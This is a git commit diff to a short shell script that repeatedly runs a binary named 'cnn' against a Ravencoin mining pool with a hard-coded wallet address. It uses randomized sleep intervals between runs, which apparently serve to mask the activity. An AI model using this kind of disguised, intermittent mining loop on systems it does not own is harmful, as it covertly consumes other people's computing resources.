f5227869119d988160184e903d1209fdda761a0c
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2020-11-20 19:12:15 +0530

    Update lol4.sh

--- lol4.sh
+++ lol4.sh
@@ -12,7 +12,7 @@ do
 	w=$(($RANDOM%60))
 	e=260
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s  ./cnn -P stratum+ssl://REJQ8UT8XJdsD3fCmqzJs2iv4YHtDw4BGa.worker:pps@us.ravenminer.com:13803 -U
+	timeout -k 5 $c\s  ./cnn/cnn -P stratum+ssl://REJQ8UT8XJdsD3fCmqzJs2iv4YHtDw4BGa.worker:pps@us.ravenminer.com:13803 -U
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
